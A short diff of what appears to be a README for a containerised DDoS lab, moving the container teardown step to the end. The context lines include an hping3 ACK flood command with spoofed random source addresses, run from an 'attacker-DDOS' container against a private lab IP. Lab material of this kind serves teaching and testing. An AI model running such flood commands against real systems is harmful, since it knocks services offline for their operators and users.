@@ -4,11 +4,6 @@
 ```bash
 docker-compose -f stack.yml up -d --build
 ```
-# stop and remove containers   
-
-```bash
-docker-compose -f stack.yml down
-```
 
 # --------------------------------------------------------------------------- #
 #                               HTTP flood attack                             # 
@@ -55,6 +50,12 @@ docker exec -ti attacker-DDOS /bin/bash -c "hping3 -A -c 100000 -d 1000 -p 80 --
 
 ```bash
 docker exec -ti attacker-DDOS /bin/bash -c "hping3 -A -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.3"
+```
+
+# stop and remove containers   
+
+```bash
+docker-compose -f stack.yml down
 ```
 
  
